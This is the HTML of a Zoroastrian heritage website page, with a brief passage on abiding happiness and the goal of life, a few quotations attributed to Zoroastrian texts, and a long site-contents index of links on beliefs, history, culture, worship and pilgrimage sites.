<p class="text" style="margin-left:0px">Abiding Happiness, Spiritual Resplendence, Peace & Serenity</p>
<p class="text" style="text-align: justify">
The goal of our lives is to achieve abiding happiness, spiritual resplendence and peace: humanity at peace with itself and an individual at peace with oneself. An expression of abiding peace is serenity.
</p>
<br><br>

<a name="goal_life"></a>
<h2>Goal of Life</h2>

<p class="text" style="margin-left:0px"><a target="_blank" href="scriptures/selections.htm#vahishtem">Vahishtem Anghuim</a> & <a target="_blank" href="overview/index.htm#frasho-kereti">Frasho-Kereti</a>

<br>
The Best Existence & An Ideal Future<br>
The goal of life on earth is the best existence.</p>

<br><br>

<h1>Quotes from Zoroastrian Texts</h1>
<p class="text" style="text-align: justify">
&#8226;	"Happiness comes to them who bring happiness to others."<br>
&#8226;	"Abiding happiness and peace is theirs who choose goodness for its own sake - without expectation of any reward."<br>
&#8226;	"A thousand people cannot convince one by words to the extent that one person can convince a thousand by action."<br>
&#8226;	Zarathushtra: "With an open mind, seek and listen to all the highest ideals. Consider the most enlightened thoughts. Then choose your path, person by person, each for oneself."
</p><br>
</td>

<td style="background: url('images/tulip_large.gif') no-repeat; height:550px" class="col_right">
<img alt="spacer" width="230px" height="1" src="images/spacer.gif">
<h2><a href="#sitecontents">&#187 Site Contents</a></h2>
<br>

<h2>Related Sites / Blogs</h2>
<div class="text" style="border:2px solid white; padding:7px;">
<a href="http://zoroastrianheritage.blogspot.ca/">&#187 Zoroastrian Heritage Blog</a><br><br>
<a href="http://zoroaster-zarathushtra.blogspot.ca/">&#187 The Name Zoroaster, Zarathushtra or Zarathustra</a><br><br>
<a href="http://zoroastrianastrology.blogspot.com/">&#187; Zoroastrian Cosmology & Astrology Homepage</a>
</div><br>


<!--
<h2>Updated & Latest Pages</h2>
<div class="text" style="border:2px solid white; padding:7px;">
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/December_25-Yalda-Eduljee.pdf">&#187 Was December 25 Celebrated as the Birth of Mithra? Yalda</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/06/amazons-kurdish-women-warriors.html">&#187 Amazons &amp; Kurdish Women Warriors - A Tradition Continues</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/06/amazons-troy-western-realms-of-aryana.html">&#187 Amazons, Troy &amp; the Western Realms of Aryana</a> <br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/ancient-westernmost-asia-minor.html">&#187 Ancient Westernmost Asia Minor</a> <br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/herodotus-references-to-saka.html">&#187 Herodotus' References to the Saka</a> <br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/kurdish-origins-saka-pt-1-credibility.html">&#187 Kurdish Origins &amp; the Saka Claim. Pt. 1 - Credibility of Sources</a> <br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/inscriptions-found-at-c-kurdistan-iran.html">&#187 Kurdish Origins &amp; the Saka Claim. Pt. 2 - Inscriptions at Saqqez, Kurdistan (Iran)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/halicarnassus-mausoleum-its.html">&#187 Halicarnassus Mausoleum &amp; Amazonomachy Frieze Panels </a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2015/07/halicarnassus-mausoleum-pt-2-ethnicity.html">&#187 Ethnicity of Amazons, Artemisia &amp; Carians. Clues Through Attire</a> <br><br>

<a href="http://www.heritageinstitute.com/zoroastrianism/reference/Nutrition-Eduljee-Complete.pdf">&#187 Nutrition - Were Ancient Zoroastrians & Aryans Vegetarian? (pdf) Revised Mar 2015</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/Nutrition-Eduljee-Abridged.pdf">&#187 Nutrition - Were Ancient Zoroastrians & Aryans Vegetarian? - Abridged (pdf) Revised Mar 2015</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2014/08/porphyry-on-magi-animals-and-diet.html">&#187 Porphyry on the Magi, Animals and Diet (at our blog)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/death/index.htm#daenaverse">&#187 Meeting One's Daena at the Chinvat Bridge</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm#prayer">&#187 Patet/repentance prayer</a><br><br>
</div><br>

<a href="http://www.heritageinstitute.com/zoroastrianism/reference/FaroharMotif-Eduljee.pdf">&#187 Farohar/Fravahar Motif: What Does It Represent? Use of Icons and Symbols in
Zoroastrianism (pdf)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/FaroharMotif-Eduljee-Abridged.pdf">&#187 Farohar/Fravahar Motif: What Does It Represent? Use of Icons and Symbols in
Zoroastrianism - Abridged (pdf)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/death/index.htm">&#187 After Life, Funeral Customs & Death Ceremonies</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm">&#187 Pateti/Papeti (Patet/repentance prayer added)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/merv/gonur.htm">&#187 Gonur, Mouru, Murgab, Merv, Margiana</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/cyrus.htm">&#187 Cyrus the Great</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-his-religion-inspiration.html">&#187 Cyrus the Great - His Religion & Inspiration</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/pasargadae.htm">&#187 Cyrus the Great - Pasargadae, Capital</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/xenophon/cyropaedia/cyropaedia1.htm">&#187 Cyrus the Great - Xenophon's Cyropaedia</a>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-information-sources.html">&#187 Cyrus the Great - Information Sources</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-hebrew-bible-quotes.html">&#187 Cyrus the Great - Hebrew Bible Quotes</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-cyrus-cylinder.html">&#187 Cyrus Cylinder</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-its-discoverer-hormuzd.html">&#187 Cyrus Cylinder - its Discoverer Hormuzd Rassam</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-cyrus-cylinder.html">&#187 Cyrus Cylinder - Contents (Eduljee)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-contents-eduljee.html">&#187 Cyrus Cylinder - Translation (Rogers)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-translation-of-text.html">&#187 Cyrus Cylinder - Translation (Finkel)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-remarkable-discovery-of-cyrus.html">&#187 Cyrus Cylinder - its Remarkable Discovery</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-edict-chinese-cuneiform-bones.html">&#187 Cyrus' Edict & the Chinese Cuneiform Bones</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-talk-by-neil-macgregor.html">&#187 Cyrus Cylinder: Talk by Neil MacGregor, Dir. British Museum</a><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/prehistoricsites/dawn.htm">&#187 Dawn of History - Paleolithic (Palaeolithic) & Early Peoples of Greater Old Iran</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/cyrus.htm">&#187 Cyrus the Great</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-his-religion-inspiration.html">&#187 Cyrus the Great - His Religion & Inspiration</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/pasargadae.htm">&#187 Cyrus the Great - Pasargadae, Capital</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-information-sources.html">&#187 Cyrus the Great - Information Sources</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/xenophon/cyropaedia/cyropaedia1.htm">&#187 Cyrus the Great - Xenophon's Cyropaedia</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-great-hebrew-bible-quotes.html">&#187 Cyrus the Great - Hebrew Bible Quotes</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-cyrus-cylinder.html">&#187 Cyrus Cylinder</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-its-discoverer-hormuzd.html">&#187 Cyrus Cylinder - its Discoverer Hormuzd Rassam</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-cyrus-cylinder.html">&#187 Cyrus Cylinder - Contents (Eduljee)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-contents-eduljee.html">&#187 Cyrus Cylinder - Translation (Rogers)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-translation-of-text.html">&#187 Cyrus Cylinder - Translation (Finkel)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/the-remarkable-discovery-of-cyrus.html">&#187 Cyrus Cylinder - its Remarkable Discovery</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-edict-chinese-cuneiform-bones.html">&#187 Cyrus' Edict & the Chinese Cuneiform Bones</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/03/cyrus-cylinder-talk-by-neil-macgregor.html">&#187 Cyrus Cylinder: Talk by Neil MacGregor, Dir. British Museum</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2013/02/pahlavans-sakastan-1-introduction.html">&#187 Pahlavans & Sakastan</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/12/cypress-of-kashmar-source-texts-1.html">&#187 Cypress of Kashmar Sources</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/urmia/kandovan.htm">&#187 Kandovan (Troglodyte) Village (added section)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/purification/index.htm">&#187 Cleanliness & Purification Ceremonies</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/iranpersia/index.htm">&#187 Iran and Persia - Are They the Same? (substantially changed & expanded)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/languages/index.htm">&#187 Avestan, Iranian & Zoroastrian Languages (substantially expanded)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/aryans/location.htm">&#187 Aryan Homeland Location (substantially expanded)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/balkh/index.htm">&#187 Balkh (substantially expanded)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/balkh/dashly.htm">&#187 Dashly site in Balkh Region</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/summary-of-doctrines-of-zoroaster-and.html">&#187 Annotated Summary of the Doctrines of Zoroaster and Plato by George Gemistos Pletho(n)</a><br><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/maps/index.htm">&#187 Map Gallery (expanded)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/chaldean-oracles-of-zoroaster.html">&#187 (Chaldean) Oracles of Zoroaster - an Introduction</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/roman-emperor-julian-and-seven-rays.html">&#187 Roman Emperor Julian and the Seven Rays</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/pythagorean-beliefs-zoroastrianism.html">&#187 Pythagorean Beliefs & Zoroastrianism</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/golden-verses-of-pythagoras.html">&#187 Golden Verses of Pythagoras (Similar to the Zoroastrian andarz)</a><br><br>
<a href="http://zoroastrianheritage.blogspot.ca/2012/09/who-were-aryans.html">� Who Were the Aryans?</a><br><br>
<a href="http://zoroastrianheritage.blogspot.com/">&#187 Zoroastrian Heritage Blog Homepage</a><br><br>
<h2>New Downloads:</h2>
<p class="text" style="background-color:#CFF8FC; border:2px solid white; padding-left:5px;">
<a href="http://www.heritageinstitute.com/zoroastrianism/pdf/UNESCO.pdf">&#187 UNESCO's magazine on Parsi Culture & Crafts (pdf)</a>
</p><br>
<a href="http://www.heritageinstitute.com/zoroastrianism/reference/parsi/Framjee.pdf">&#187 Framjee's Parsees Their History Manners Customs (pdf)</a>
  -->
</td>
</tr></table></div>
</td></tr>
<!-- Main body upper ends-->

<!-- Main body center start-->
<tr><td width="100%">
<div align="center"><table><tr><td>
<a name="sitecontents"></a><h1 style="text-align:center;" >Site Contents - Zoroastrian Heritage</h1>
<div align="center">
<!--webbot bot="Include" U-Include="included_content/search_bar.shtml" TAG="BODY" startspan -->

<!-- search box -->
<form method="get" action="http://www.google.com/search">
<div class="text" style="width:40em">
<table border="0" cellpadding="0">
<tr><td class="text" align="right"><b>Search Our Site:</b>
<input type="text"   name="q" size="25"
 maxlength="255" value="">
<input type="submit" value="Google Search"></td></tr>
<tr><td align="right" style="font-size:75%">
<input type="hidden"  name="sitesearch"
 value="http://www.heritageinstitute.com/zoroastrianism/" checked>
</td></tr></table>
</div>
</form>

<!--webbot bot="Include" i-checksum="26310" endspan --></div>
			</td>
</tr></table></div>
</td></tr>
<!-- Main body center ends-->

<!-- Main body lower start-->
<tr><td width="100%">
<div style="margin-left:50px" align="center"><table><tr>
<td class="col_A">
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages01Intro.shtml" TAG="BODY" startspan -->
<h2><a title="Home page & Introduction to Zoroastrianism" href="http://www.heritageinstitute.com/zoroastrianism/contents_introduction.htm">Introduction to Zoroastrianism</a></h2>

<p class="sidebar1"><a title="Home page, Zoroastrian creed, way of life, purpose and goals" href="index.htm">Home</a></p>
<p class="sidebar1"><a title="An ancient legend retold" href="grain/index.htm">Legend of the Grain of Wisdom</a></p>

<p class="sidebar1"><b><a title="Simplifies Overview of Zoroastrianism" href="overview/simplified.htm">Overview Simplified: What is Zoroastrianism?<br>(without references)</a></b></p>

<p class="sidebar1"><a title="Expanded Overview of Zoroastrianism with references" href="overview/index.htm"><b>Overview Expanded: What is Zoroastrianism?</b><br>(with references & more Avestan names)</a></p>
<p class="sidebar1"><a title="Beliefs & Philosophy"	href="overview/index.htm#philosophy"> - Beliefs & Philosophy</a></p>
<p class="sidebar1"><a title="Creation and Existence, Coexistence, Choice, Moderation" href="overview/index.htm#philosophy">- Creation, Existence & Coexistence</a></p>
<p class="sidebar1"><a title="Extremes & Moderation" href="overview/index.htm#philosophy">- Moderation</a></p>
<p class="sidebar1"><a title="Free Will, Reason, Wisdom & Choice. Conscience - Sarosh"
																			 		href="overview/index.htm#wisdom">- Wisdom & Choice, Free Will, Reason</a></p>
<p class="sidebar1"><a title="Spiritual Components in Nature & Human Beings. Spirit - Mainyu. Soul, Urvan - Fate of the Soul." 																													href="overview/index.htm#components">- Spirit, Soul, Spiritual Components</a></p>
<p class="sidebar1"><a title="Concepts of Time" 									href="overview/index.htm#conceptsoftime">- Concepts of Time</a></p>
<p class="sidebar1"><a title="Fravashi. Khvarenah. Farohar or Fravahar" 			href="overview/index.htm#components">- Fravashi. Khvarenah. Farohar or Fravahar</a></p>
<p class="sidebar1"><a title="Spiritual Quest" 										href="overview/index.htm#spiritual">- Spiritual Quest</a></p>
<p class="sidebar1"><a title="Goal in Life - Ushta"							 		href="overview/index.htm#ushta">- Goal in Life - Ushta</a></p>
<p class="sidebar1"><a title="Nature of God, Ahura Mazda" 							href="overview/index.htm#god">- God, Ahura Mazda</a></p>
<p class="sidebar1"><a title="Amesha Spentas - Eternal Beneficent Brilliance" 		href="overview/index.htm#god">- Amesha Spentas - Eternal Beneficent Brilliance</a></p>
<p class="sidebar1"><a title="Way of Life & Ethos" 									href="overview/index.htm#zoroastrianway">- Way of Life & Ethos</a></p>
<p class="sidebar1"><a title="Amesha Spentas as ideals in human development. Enlightenment" 
																					href="overview/index.htm#ameshaspentas_human">- Enlightenment, Ageless Wisdom</a></p>
<p class="sidebar1"><a title="Relationship of Human Beings to Nature and the Environment" href="overview/index.htm#environment">- Environment</a></p>
<p class="sidebar1"><a title="Lush Gardens - Paradise" href="overview/index.htm#gardens">- Lush Gardens - Paradise</a></p>
<p class="sidebar1"><a title="Zoroastrian Religious Texts - Avesta, Zand, Gathas, Pahlavi texts. How Zarathushtra's Teachings Were Preserved and Destroyed" 																								href="overview/index.htm#texts">- Religious Texts. Avesta & Zand</a></p>
<p class="sidebar1"><a title="Mathra / Manthra" 									href="overview/index.htm#manthras">- Mathra / Manthra</a></p>
<p class="sidebar1"><a title="Traditional Name of the Religion" 									href="overview/index.htm#name">- Traditional Name of the Religion</a></p>
<p class="sidebar1"><a title="Labels Placed on Zoroastrianism" 									href="overview/index.htm#labels">- Labels Placed on Zoroastrianism</a></p>
<p class="sidebar1"><a title="Eternal Flame. Role of Fire" href="overview/index.htm#flame">- Eternal Flame</a></p>

<p class="sidebar1"><b><a title="Zarathushtra / Zoroaster - his life and times" href="zarathushtra/index.htm">Zarathushtra / Zoroaster</a></b></p>

<!--webbot bot="Include" i-checksum="31840" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages02Zism.shtml" TAG="BODY" startspan -->
<h2><a title="Understanding Zoroastrianism & Zoroastrians" href="http://www.heritageinstitute.com/zoroastrianism/contents_introduction.htm">Understanding Zoroastrianism &<br>Zoroastrians</a></h2>

<p class="sidebar1"><a title="Similarities between Einstein and Zoroastrian views on God and the nature of existence" href="einstein/index.htm">Einstein & Zoroastrianism on God and Existence</a></p>
<p class="sidebar1"><a title="Zoroastrian Ethics by MA Buch (pdf)" href="pdf/zoroastrianEthics.pdf">Zoroastrian Ethics by MA Buch (pdf)</a></p>
<p class="sidebar1"><a title="Olympic Flame & Zoroastrianism" href="olympicflame/index.htm">Olympic Flame & Zoroastrianism. Shared Values</a></p>

<h4> Western Views & Zoroastrianism</h4>
<p class="sidebar1"><a title="Zoroastrianism seen by Western authors 1500 - 1900 ACE" href="westernauthors/index.htm">- Post Classical Western Authors & Views</a></p>
<p class="sidebar1"><a title="Western Views on Aryans" href="aryans/western.htm">- Western Views on Aryans</a></p>

<p class="sidebar1"><a title="Friedrich Nietzsche. Introduction to Thus Spake Zarathushtra (Zarathushtra)" href="westernauthors/nietzsche.htm">Friedrich Nietzsche</a></p>
<p class="sidebar1"><a title="Friedrich Nietzsche. Thus Spake Zarathustra (text)" href="westernauthors/nietzschezarathushtraInt.htm">- Thus Spake Zarathustra (text)</a></p>
<p class="sidebar1"><a title="Friedrich Nietzsche. Thus Spake Zarathustra videos" href="westernauthors/nietzscheVideo.htm">- Thus Spake Zarathustra videos</a></p>

<h4> Zoroastrian Sects</h4>
<p class="sidebar1"><a title="Mazdak & Mazdakism" href="sects/mazdak.htm">- Mazdak & Mazdakism</a></p>
<p class="sidebar1"><a title="Post 650CE Revolutionary Sects" href="sects/index.htm">- Post 650CE Revolutionary Sects</a></p>
<p class="sidebar1"><a title="Babak Khorramdin" href="sects/babak.htm">- Babak Khorramdin</a></p>
<p class="sidebar1"><a title="R. C. Zaehner on Zurvan" href="reference/zaehner/dawnVarZur9_1.htm">R. C. Zaehner on Zurvan</a><br></p>
<p class="sidebar1"><a title="Varieties of Zurvanism" href="reference/zaehner/dawnVarZur9_1.htm">- Varieties of Zurvanism</a><br></p>
<p class="sidebar1"><a title="Classical Zurvanism" href="reference/zaehner/dawnVarZur10_1.htm">- Classical Zurvanism</a><br></p>
<p class="sidebar1"><a title="Zurvan" href="reference/zaehner/dawnVarZur11_1.htm">- Zurvan</a><br></p>

<h4> Zoroastrian Demographics</h4>
<p class="sidebar1"><a title="Zoroastrian Population Figures, Diaspora and Group Names" href="demographics/index.htm">Demographics. Group Names</a></p>
<p class="sidebar1"><a title="Dinyar Patel: Rescuing Our Community from a Demographic Crisis" href="pdf/patelDemographics.pdf">- Dinyar Patel: Demographic Crisis</a></p>
<!--webbot bot="Include" i-checksum="41041" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages03Culture.shtml" TAG="BODY" startspan -->
<h2><a title="Arts, Food, Culture & Zoroastrian" href="http://www.heritageinstitute.com/zoroastrianism/contents_artmusic.htm">Arts, Food & Culture</a></h2>
<p class="sidebar1"><a title="BBC's Taste Of Iran Videos" href="bbc_taste_of_iran/index.htm">BBC's Taste Of Iran Videos</a></p>
<p class="sidebar1"><a title="Western Composers & Zoroastrianism" href="composers/index.htm">Western Composers & Zoroastrianism</a></p>
<p class="sidebar1"><a title="Avestan Calligraphy video" href="languages/index.htm#avestancalligraphy.htm">Avestan Calligraphy video</a></p>
<p class="sidebar1"><a title="Fire of Spring -<br>&nbsp; Omar Khayyam Selections" href="khayyam/index.htm">Fire of Spring -<br>&nbsp; Omar Khayyam Selections</a></p>
<p class="sidebar1"><a title="Persian Gardens, Cyrus' Gardens at Pasargadae, pairidaeza, baghs" href="garden/index.htm">Persian Gardens</a></p>
<!--webbot bot="Include" i-checksum="2078" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages04Heritage.shtml" TAG="BODY" startspan -->
<h2><a title="Heritage Milestones & Legacy" href="http://www.heritageinstitute.com/zoroastrianism/contents_heritage.htm">Heritage Legacy</a></h2>
<p class="sidebar1"><a title="Aryan Trade & Zoroastrian History" href="http://www.heritageinstitute.com/zoroastrianism/aryans/trade.htm">Aryan Trade</a></p>
<p class="sidebar1"><a title="Sogdian Trade. Silk Roads. China" href="http://www.heritageinstitute.com/zoroastrianism/sugd/trade.htm">Sogdian Trade. Silk Roads. China</a></p>
<p class="sidebar1"><a title="Boteh (Paisley) design in Zoroastrian Aryan design" href="http://www.heritageinstitute.com/zoroastrianism/trade/paisley.htm">Boteh (Paisley)</a></p>
<p class="sidebar1"><a title="Termeh - Heritage Fabric from Yazd and Kerman" href="http://www.heritageinstitute.com/zoroastrianism/trade/termeh.htm">Termeh, Heritage Fabric</a></p>
<p class="sidebar1"><a title="Gara Sari. Zoroastrian Parsi-Irani Heritage. Fashion & a Fusion of Cultures From Along the Silk Roads" href="http://www.heritageinstitute.com/zoroastrianism/parsi/gara.htm">Gara Sari</a></p>
<p class="sidebar1"><a title="Kareez (Qanat) Water Distribution" href="http://www.heritageinstitute.com/zoroastrianism/kareez/index.htm">Kareez (Qanat) Water Distribution</a></p>
<p class="sidebar1"><a title="Irani Cafes & Bakeries of India" href="irani/cafe.htm">- Irani Cafes & Bakeries of India</a></p>
<p class="sidebar1"><a title="Zoroastrians of India. Parsees & Iranis - a Photographic Heritage" href="zoroastrians/parsees1.htm">- Zoroastrians of India. Parsees & Iranis - Old Photos</a></p>
<p class="sidebar1"><a title="Persian Gardens, Cyrus' Gardens at Pasargadae, pairidaeza, baghs" href="garden/index.htm">Persian Gardens</a></p>
<!--webbot bot="Include" i-checksum="54619" endspan --><br>
</td>

<td class="col_A">
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages05WorshipPrayer.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Worship, Eternal Flame, Prayer" href="http://www.heritageinstitute.com/zoroastrianism/contents_worship.htm">Worship - Prayer</a></h2>

<p class="sidebar1"><a title="Worship Introduction" href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm">Worship Introduction</a></p>
<p class="sidebar1"><a title="Prayer - Manthra" href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#prayer">Prayer - Manthra</a></p>
<p class="sidebar1"><a title="Healing Prayer" href="http://www.heritageinstitute.com/zoroastrianism/worship/healingprayer.htm">Healing Prayer</a></p>
<p class="sidebar1"><a title="Early Worship" href="http://www.heritageinstitute.com/zoroastrianism/worship/fire.htm#early">Early Worship</a></p>
<!--webbot bot="Include" i-checksum="18367" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages06Fire.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Worship, Eternal Flame, Prayer, Temples, Priesthood, Atharvan, Magi" href="http://www.heritageinstitute.com/zoroastrianism/worship/fire.htm">Fire - Eternal Flame</a></h2>

<p class="sidebar1"><a title="Fire & Light in Zoroastrianism" href="http://www.heritageinstitute.com/zoroastrianism/worship/fire.htm">Fire & Light</a></p>
<p class="sidebar1"><a title="Zoroastrian Worship, Eternal Flame, Prayer" href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#flame">Eternal Flame</a></p>
<!--webbot bot="Include" i-checksum="63959" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages07PriestsCeremony.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Priesthood - Atharvan, Magi, Modern Priests" href="http://www.heritageinstitute.com/zoroastrianism/priests/index.htm">Priests & Cermonies</a></h2>

<p class="sidebar1"><a title="Zoroastrian Priesthood - Atharvan, Magi, Modern Priests" href="http://www.heritageinstitute.com/zoroastrianism/priests/index.htm">Priesthood</a></p>
<p class="sidebar1"><a title="Zoroastrian Priesthood - Atharvan, Magi, Modern Priests" href="http://www.heritageinstitute.com/zoroastrianism/priests/index.htm">Magi</a></p>
<p class="sidebar1"><a title="Zoroastrian Liturgical Ceremonies. Ceremonies of the inner and outer circles" href="http://www.heritageinstitute.com/zoroastrianism/ceremonies/liturgy.htm">Liturgical Ceremonies</a></p>
<!--webbot bot="Include" i-checksum="1021" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages08WorshipArticles.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Worship, Eternal Flame, Prayer, Temples, Priesthood, Atharvan, Magi" href="http://www.heritageinstitute.com/zoroastrianism/contents_worship.htm">Articles of Faith</a></h2>

<p class="sidebar1"><a title="Sudrah / Sudre / Sudreh and Kusti / Kushti" href="http://www.heritageinstitute.com/zoroastrianism/navjote/index.htm#sudrah_kusti">Sudrah/Sudre/Sudreh and Kusti/Kushti</a></p>
<p class="sidebar1"><a title="Sace / Ses Ceremonial Tray" href="http://www.heritageinstitute.com/zoroastrianism/ceremonies/sace.htm">Sace / Ses Ceremonial Tray</a></p>

<!--webbot bot="Include" i-checksum="46356" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages09Temples.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Places of Worship" href="http://www.heritageinstitute.com/zoroastrianism/temples/index.htm">Places of Worship - Temples</a></h2>

<p class="sidebar1"><a title="Outdoor Worship. Khorog Tajikistan" href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#early">Outdoor Worship. Khorog Tajikistan</a></p>

<p class="sidebar1"><b><a title="Chahar-taqi design, Ani Turkey, Surakhani, Azerbaijan" href="http://www.heritageinstitute.com/zoroastrianism/temples/index.htm">Early Fire Houses and Temples</a></b></p>
<p class="sidebar1"><a title="Chahar-Taqi design" href="http://www.heritageinstitute.com/zoroastrianism/temples/index.htm#chahartaqi">- Chahar-Taqi Design</a></p>
<p class="sidebar1"><a title="Temple Ruins at Ani, Turkey" href="http://www.heritageinstitute.com/zoroastrianism/temples/index.htm#ani">- Temple Ruins at Ani, Turkey</a></p>
<p class="sidebar1"><a title="Temple at Surakhani, Azerbaijan" href="http://www.heritageinstitute.com/zoroastrianism/temples/index.htm#surakhani">- Temple at Surakhani, Azerbaijan</a></p>
<p class="sidebar1"><a title="Azargoshasb Temple Site, Shiz (Takht-e Suleiman), West Azerbaijan" href="http://www.heritageinstitute.com/zoroastrianism/urmia/index.htm#shiz">- Azargoshasb Temple Site, West Azerbaijan</a></p>

<p class="sidebar1"><b><a title="Modern Zoroastrian Places of Worship" href="http://www.heritageinstitute.com/zoroastrianism/temples/atashbahram.htm">Modern Fire Temples</a></b></p>
<p class="sidebar1"><a title="Atash Bahram" href="http://www.heritageinstitute.com/zoroastrianism/temples/atashbahram.htm">- Atash Bahram</a></p>
<p class="sidebar1"><a title="Agiary, Darbe Mehr" href="http://www.heritageinstitute.com/zoroastrianism/temples/agiary.htm">- Agiary, Darbe Mehr</a></p>
<!--webbot bot="Include" i-checksum="1507" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages10Pilgrimage.shtml" TAG="BODY" startspan -->
<h2><a title="Pilgrimage Sites" href="http://www.heritageinstitute.com/zoroastrianism/worship/pilgrimage.htm">Pilgrimage Sites</a></h2>
<p class="sidebar1"><a title="Zoroastrian Pilgrimage sites in Yazd, Iran" href="http://www.heritageinstitute.com/zoroastrianism/worship/pilgrimage.htm"><b>Yazd, Iran</b></a></p>
<p class="sidebar1"><a title="Pir-e Sabz / Chak-Chak" href="http://www.heritageinstitute.com/zoroastrianism/worship/piresabz.htm">- Pir-e Sabz / Chak-Chak</a></p>
<p class="sidebar1"><a title="Seti Pir" href="http://www.heritageinstitute.com/zoroastrianism/worship/setinaraki.htm#setipir">- Seti Pir</a></p>
<p class="sidebar1"><a title="Pir-e Naraki" href="http://www.heritageinstitute.com/zoroastrianism/worship/setinaraki.htm#naraki">- Pir-e Naraki</a></p>
<p class="sidebar1"><a title="Pir-e Banu" href="http://www.heritageinstitute.com/zoroastrianism/worship/banunarestaneh.htm#pirebanu">- Pir-e Banu</a></p>
<p class="sidebar1"><a title="Pir-e Narestaneh" href="http://www.heritageinstitute.com/zoroastrianism/worship/banunarestaneh.htm#pirenarestaneh">- Pir-e Narestaneh</a></p>
<p class="sidebar1"><a title="Pir-e Herisht" href="http://www.heritageinstitute.com/zoroastrianism/worship/herishtabarkuh.htm#pireherisht">- Pir-e Herisht</a></p>
